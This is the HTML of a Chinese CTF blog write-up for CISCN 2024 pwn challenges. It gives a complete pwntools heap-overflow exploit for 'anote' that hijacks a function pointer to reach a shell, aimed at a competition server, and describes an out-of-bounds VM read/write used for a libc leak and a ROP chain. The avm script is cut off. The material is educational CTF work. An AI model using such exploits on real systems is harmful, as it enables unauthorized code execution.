@@ -1,0 +1,635 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>ccbciscn | JuicyMio's Blog</title>
+<meta name=keywords content="pwn"><meta name=description content='期末作业太多了，没什么时间详细写wp。不过三战国赛终于有望进入半决赛了，自己也出了个唯二解的二血，还是值得纪念一下的。
+吐槽一下，怎么各个方向的题目数量都和赛前发的表对不上，本来以为pwn压力不大，主动承担了做一大半理论题的任务，结果下午看到上了三个pwn感觉天都塌了。
+anote
+发现创建0x1c大小的堆块后，可以输入超过这个长度。并且每个堆块的开头有一个函数指针，在edit结束后会调用该函数指针。
+因此可以创建两个堆块，将后门函数的地址system("/bin/sh")写在第一个堆块中，然后通过前一个的edit溢出写后一个的函数指针，直接改写成第一个堆块存储后门函数的地址。然后调用后一个堆块的edit，就可以执行后门函数，堆块布局如下。
+堆地址由show时的gift直接给出，只需要稍加计算。
+
+
+exp:
+```Python
+#!/usr/bin/env python3
+
+from pwn import *
+import os
+
+exe = ELF("./note_patched")
+
+context.binary = exe
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("123.56.29.99", 26768)
+
+    return r
+
+
+def dbg(cmd=""):
+    if args.LOCAL:
+        gdb.attach(r, cmd)
+        pause()
+
+
+def choice(i):
+    r.sendlineafter(">>", str(i))
+
+
+def show(idx):
+    choice(2)
+    r.sendlineafter("index: ", str(idx))
+
+
+def edit(idx, len, content):
+    choice(3)
+    r.sendlineafter("index: ", str(idx))
+    r.sendlineafter("len: ", str(len))
+    r.sendafter("content:", content)
+
+
+context.log_level = "DEBUG"
+
+
+def main():
+    global r
+    r = conn()
+    choice(1)
+    show(0)
+    r.recvuntil("gift: ")
+    addr = int(r.recvline()[:-1], 16)
+    choice(1)
+    edit(
+        0,
+        28,
+        p32(0x80489CE)
+        + b"a" * (0x1C - 8 - 8)
+        + p32(0)
+        + p32(0x21)
+        + p32(addr + 8)
+        + b"\n",
+    )
+    edit(1, 1, b"0\n")
+
+    # good luck pwning :)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+ 
+    main()
+avm
+主要漏洞在于store和load指令检查时只检查reg+BYTE2(v3),计算时计算的是reg+HIWORD(v3)&amp;0xFFF，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。'><meta name=author content="JuicyMio"><link rel=canonical href=https://juicymio.github.io/posts/ccbciscn/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://juicymio.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://juicymio.github.io/posts/ccbciscn/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="ccbciscn"><meta property="og:description" content='期末作业太多了，没什么时间详细写wp。不过三战国赛终于有望进入半决赛了，自己也出了个唯二解的二血，还是值得纪念一下的。
+吐槽一下，怎么各个方向的题目数量都和赛前发的表对不上，本来以为pwn压力不大，主动承担了做一大半理论题的任务，结果下午看到上了三个pwn感觉天都塌了。
+anote
+发现创建0x1c大小的堆块后，可以输入超过这个长度。并且每个堆块的开头有一个函数指针，在edit结束后会调用该函数指针。
+因此可以创建两个堆块，将后门函数的地址system("/bin/sh")写在第一个堆块中，然后通过前一个的edit溢出写后一个的函数指针，直接改写成第一个堆块存储后门函数的地址。然后调用后一个堆块的edit，就可以执行后门函数，堆块布局如下。
+堆地址由show时的gift直接给出，只需要稍加计算。
+
+
+exp:
+```Python
+#!/usr/bin/env python3
+
+from pwn import *
+import os
+
+exe = ELF("./note_patched")
+
+context.binary = exe
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("123.56.29.99", 26768)
+
+    return r
+
+
+def dbg(cmd=""):
+    if args.LOCAL:
+        gdb.attach(r, cmd)
+        pause()
+
+
+def choice(i):
+    r.sendlineafter(">>", str(i))
+
+
+def show(idx):
+    choice(2)
+    r.sendlineafter("index: ", str(idx))
+
+
+def edit(idx, len, content):
+    choice(3)
+    r.sendlineafter("index: ", str(idx))
+    r.sendlineafter("len: ", str(len))
+    r.sendafter("content:", content)
+
+
+context.log_level = "DEBUG"
+
+
+def main():
+    global r
+    r = conn()
+    choice(1)
+    show(0)
+    r.recvuntil("gift: ")
+    addr = int(r.recvline()[:-1], 16)
+    choice(1)
+    edit(
+        0,
+        28,
+        p32(0x80489CE)
+        + b"a" * (0x1C - 8 - 8)
+        + p32(0)
+        + p32(0x21)
+        + p32(addr + 8)
+        + b"\n",
+    )
+    edit(1, 1, b"0\n")
+
+    # good luck pwning :)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+ 
+    main()
+avm
+主要漏洞在于store和load指令检查时只检查reg+BYTE2(v3),计算时计算的是reg+HIWORD(v3)&amp;0xFFF，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。'><meta property="og:type" content="article"><meta property="og:url" content="https://juicymio.github.io/posts/ccbciscn/"><meta property="og:image" content="https://juicymio.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-12-16T00:00:00+00:00"><meta property="article:modified_time" content="2024-12-16T00:00:00+00:00"><meta property="og:site_name" content="JuicyMio's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://juicymio.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="ccbciscn"><meta name=twitter:description content='期末作业太多了，没什么时间详细写wp。不过三战国赛终于有望进入半决赛了，自己也出了个唯二解的二血，还是值得纪念一下的。
+吐槽一下，怎么各个方向的题目数量都和赛前发的表对不上，本来以为pwn压力不大，主动承担了做一大半理论题的任务，结果下午看到上了三个pwn感觉天都塌了。
+anote
+发现创建0x1c大小的堆块后，可以输入超过这个长度。并且每个堆块的开头有一个函数指针，在edit结束后会调用该函数指针。
+因此可以创建两个堆块，将后门函数的地址system("/bin/sh")写在第一个堆块中，然后通过前一个的edit溢出写后一个的函数指针，直接改写成第一个堆块存储后门函数的地址。然后调用后一个堆块的edit，就可以执行后门函数，堆块布局如下。
+堆地址由show时的gift直接给出，只需要稍加计算。
+
+
+exp:
+```Python
+#!/usr/bin/env python3
+
+from pwn import *
+import os
+
+exe = ELF("./note_patched")
+
+context.binary = exe
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        if args.DEBUG:
+            gdb.attach(r)
+    else:
+        r = remote("123.56.29.99", 26768)
+
+    return r
+
+
+def dbg(cmd=""):
+    if args.LOCAL:
+        gdb.attach(r, cmd)
+        pause()
+
+
+def choice(i):
+    r.sendlineafter(">>", str(i))
+
+
+def show(idx):
+    choice(2)
+    r.sendlineafter("index: ", str(idx))
+
+
+def edit(idx, len, content):
+    choice(3)
+    r.sendlineafter("index: ", str(idx))
+    r.sendlineafter("len: ", str(len))
+    r.sendafter("content:", content)
+
+
+context.log_level = "DEBUG"
+
+
+def main():
+    global r
+    r = conn()
+    choice(1)
+    show(0)
+    r.recvuntil("gift: ")
+    addr = int(r.recvline()[:-1], 16)
+    choice(1)
+    edit(
+        0,
+        28,
+        p32(0x80489CE)
+        + b"a" * (0x1C - 8 - 8)
+        + p32(0)
+        + p32(0x21)
+        + p32(addr + 8)
+        + b"\n",
+    )
+    edit(1, 1, b"0\n")
+
+    # good luck pwning :)
+
+    r.interactive()
+
+
+if __name__ == "__main__":
+ 
+    main()
+avm
+主要漏洞在于store和load指令检查时只检查reg+BYTE2(v3),计算时计算的是reg+HIWORD(v3)&amp;0xFFF，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://juicymio.github.io/posts/"},{"@type":"ListItem","position":2,"name":"ccbciscn","item":"https://juicymio.github.io/posts/ccbciscn/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"ccbciscn","name":"ccbciscn","description":"期末作业太多了，没什么时间详细写wp。不过三战国赛终于有望进入半决赛了，自己也出了个唯二解的二血，还是值得纪念一下的。 吐槽一下，怎么各个方向的题目数量都和赛前发的表对不上，本来以为pwn压力不大，主动承担了做一大半理论题的任务，结果下午看到上了三个pwn感觉天都塌了。\nanote 发现创建0x1c大小的堆块后，可以输入超过这个长度。并且每个堆块的开头有一个函数指针，在edit结束后会调用该函数指针。 因此可以创建两个堆块，将后门函数的地址system(\u0026quot;/bin/sh\u0026quot;)写在第一个堆块中，然后通过前一个的edit溢出写后一个的函数指针，直接改写成第一个堆块存储后门函数的地址。然后调用后一个堆块的edit，就可以执行后门函数，堆块布局如下。 堆地址由show时的gift直接给出，只需要稍加计算。 exp:\n```Python #!/usr/bin/env python3 from pwn import * import os exe = ELF(\u0026#34;./note_patched\u0026#34;) context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.DEBUG: gdb.attach(r) else: r = remote(\u0026#34;123.56.29.99\u0026#34;, 26768) return r def dbg(cmd=\u0026#34;\u0026#34;): if args.LOCAL: gdb.attach(r, cmd) pause() def choice(i): r.sendlineafter(\u0026#34;\u0026gt;\u0026gt;\u0026#34;, str(i)) def show(idx): choice(2) r.sendlineafter(\u0026#34;index: \u0026#34;, str(idx)) def edit(idx, len, content): choice(3) r.sendlineafter(\u0026#34;index: \u0026#34;, str(idx)) r.sendlineafter(\u0026#34;len: \u0026#34;, str(len)) r.sendafter(\u0026#34;content:\u0026#34;, content) context.log_level = \u0026#34;DEBUG\u0026#34; def main(): global r r = conn() choice(1) show(0) r.recvuntil(\u0026#34;gift: \u0026#34;) addr = int(r.recvline()[:-1], 16) choice(1) edit( 0, 28, p32(0x80489CE) + b\u0026#34;a\u0026#34; * (0x1C - 8 - 8) + p32(0) + p32(0x21) + p32(addr + 8) + b\u0026#34;\\n\u0026#34;, ) edit(1, 1, b\u0026#34;0\\n\u0026#34;) # good luck pwning :) r.interactive() if __name__ == \u0026#34;__main__\u0026#34;: main() avm 主要漏洞在于store和load指令检查时只检查reg+BYTE2(v3),计算时计算的是reg+HIWORD(v3)\u0026amp;0xFFF，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。\n","keywords":["pwn"],"articleBody":"期末作业太多了，没什么时间详细写wp。不过三战国赛终于有望进入半决赛了，自己也出了个唯二解的二血，还是值得纪念一下的。 吐槽一下，怎么各个方向的题目数量都和赛前发的表对不上，本来以为pwn压力不大，主动承担了做一大半理论题的任务，结果下午看到上了三个pwn感觉天都塌了。\nanote 发现创建0x1c大小的堆块后，可以输入超过这个长度。并且每个堆块的开头有一个函数指针，在edit结束后会调用该函数指针。 因此可以创建两个堆块，将后门函数的地址system(\"/bin/sh\")写在第一个堆块中，然后通过前一个的edit溢出写后一个的函数指针，直接改写成第一个堆块存储后门函数的地址。然后调用后一个堆块的edit，就可以执行后门函数，堆块布局如下。 堆地址由show时的gift直接给出，只需要稍加计算。 exp:\n```Python #!/usr/bin/env python3 from pwn import * import os exe = ELF(\"./note_patched\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.DEBUG: gdb.attach(r) else: r = remote(\"123.56.29.99\", 26768) return r def dbg(cmd=\"\"): if args.LOCAL: gdb.attach(r, cmd) pause() def choice(i): r.sendlineafter(\"\u003e\u003e\", str(i)) def show(idx): choice(2) r.sendlineafter(\"index: \", str(idx)) def edit(idx, len, content): choice(3) r.sendlineafter(\"index: \", str(idx)) r.sendlineafter(\"len: \", str(len)) r.sendafter(\"content:\", content) context.log_level = \"DEBUG\" def main(): global r r = conn() choice(1) show(0) r.recvuntil(\"gift: \") addr = int(r.recvline()[:-1], 16) choice(1) edit( 0, 28, p32(0x80489CE) + b\"a\" * (0x1C - 8 - 8) + p32(0) + p32(0x21) + p32(addr + 8) + b\"\\n\", ) edit(1, 1, b\"0\\n\") # good luck pwning :) r.interactive() if __name__ == \"__main__\": main() avm 主要漏洞在于store和load指令检查时只检查reg+BYTE2(v3),计算时计算的是reg+HIWORD(v3)\u00260xFFF，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。\n地址的计算通过加减和左移右移即可。\n由于没有自增，而且本地和远程偏移不同，寄存器初始值都是0， 获取数字1比较困难。最后通过在opcode中自己加入一个1的方式获取，这样的偏移肯定是固定的。\n而libc地址的偏移也很奇怪，我试了多个本地能通过的偏移，远程都不行。最后获取栈上最远处的__libc_start_main中的返回地址，终于打通了远程。 #!/usr/bin/env python3 from pwn import * import os exe = ELF(\"./pwn_patched\") libc = ELF(\"./libc.so.6\") ld = ELF(\"./ld-2.35.so\") context.binary = exe def conn(): if args.LOCAL: r = process([exe.path]) if args.DEBUG: gdb.attach(r) else: r = remote(\"47.94.1.14\", 28709) return r def dbg(cmd=\"\"): if args.LOCAL: gdb.attach(r, cmd) pause() def add(r1, r2, r3): # r1 = r2+r3 return p32((1 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def sub(r1, r2, r3): # r1 = r2-r3 return p32((2 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def mul(r1, r2, r3): # r1 = r2/r3 return p32((3 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def div(r1, r2, r3): # r1 = r2*r3 return p32((4 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def xor(r1, r2, r3): # r1 = r2^r3 return p32((5 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def bitand(r1, r2, r3): # r1 = r2\u0026r3 return p32((6 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def bitand(r1, r2, r3): # r1 = r2/r3 return p32((6 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def shr(r1, r2, r3): # r1 = r2\u003e\u003er3 return p32((8 \u003c\u003c 28) | (r3 \u003c\u003c 16) | (r2 \u003c\u003c 5) | r1) def shl(r1, r2, r3): # r1 = r2\u003c","wordCount":"980","inLanguage":"en","image":"https://juicymio.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-12-16T00:00:00Z","dateModified":"2024-12-16T00:00:00Z","author":[{"@type":"Person","name":"JuicyMio"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://juicymio.github.io/posts/ccbciscn/"},"publisher":{"@type":"Organization","name":"JuicyMio's Blog","logo":{"@type":"ImageObject","url":"https://juicymio.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://juicymio.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://juicymio.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://juicymio.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://juicymio.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://juicymio.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://juicymio.github.io/friends/ title=friends><span>friends</span></a></li><li><a href=https://juicymio.github.io/about/ title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://juicymio.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://juicymio.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">ccbciscn</h1><div class=post-meta><span title='2024-12-16 00:00:00 +0000 UTC'>December 16, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;980 words&nbsp;·&nbsp;JuicyMio&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/ccbciscn.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#anote>anote</a></li><li><a href=#avm>avm</a></li><li><a href=#anyip>anyip</a></li></ul></li></ul></nav></div></details></div><div class=post-content><p>期末作业太多了，没什么时间详细写wp。不过三战国赛终于有望进入半决赛了，自己也出了个唯二解的二血，还是值得纪念一下的。
+吐槽一下，怎么各个方向的题目数量都和赛前发的表对不上，本来以为pwn压力不大，主动承担了做一大半理论题的任务，结果下午看到上了三个pwn感觉天都塌了。</p><h3 id=anote>anote<a hidden class=anchor aria-hidden=true href=#anote>#</a></h3><p>发现创建0x1c大小的堆块后，可以输入超过这个长度。并且每个堆块的开头有一个函数指针，在edit结束后会调用该函数指针。
+因此可以创建两个堆块，将后门函数的地址system("/bin/sh")写在第一个堆块中，然后通过前一个的edit溢出写后一个的函数指针，直接改写成第一个堆块存储后门函数的地址。然后调用后一个堆块的edit，就可以执行后门函数，堆块布局如下。
+堆地址由show时的gift直接给出，只需要稍加计算。
+<img loading=lazy src=/ccbciscn-2.png alt>
+exp:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=err>```</span><span class=n>Python</span>
+</span></span><span class=line><span class=cl><span class=c1>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./note_patched&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>DEBUG</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;123.56.29.99&#34;</span><span class=p>,</span> <span class=mi>26768</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>(</span><span class=n>cmd</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>pause</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choice</span><span class=p>(</span><span class=n>i</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt;&gt;&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=nb>len</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;index: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;len: &#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=nb>len</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;content:&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;DEBUG&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>r</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;gift: &#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>],</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>choice</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=mi>28</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=n>p32</span><span class=p>(</span><span class=mh>0x80489CE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mh>0x1C</span> <span class=o>-</span> <span class=mi>8</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=mh>0x21</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;0</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># good luck pwning :)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></div><h3 id=avm>avm<a hidden class=anchor aria-hidden=true href=#avm>#</a></h3><p>主要漏洞在于store和load指令检查时只检查reg+BYTE2(v3),计算时计算的是reg+HIWORD(v3)&amp;0xFFF，所以可以越界读写虚拟机的缓冲区s。于是可以通过load栈上残留获取libc地址，再经过计算构造rop链，通过store越界写到栈上返回地址处。</p><p>地址的计算通过加减和左移右移即可。</p><p>由于没有自增，而且本地和远程偏移不同，寄存器初始值都是0， 获取数字1比较困难。最后通过在opcode中自己加入一个1的方式获取，这样的偏移肯定是固定的。</p><p>而libc地址的偏移也很奇怪，我试了多个本地能通过的偏移，远程都不行。最后获取栈上最远处的__libc_start_main中的返回地址，终于打通了远程。
+<img loading=lazy src=/ccbciscn-3.png alt></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./pwn_patched&#34;</span><span class=p>)</span>
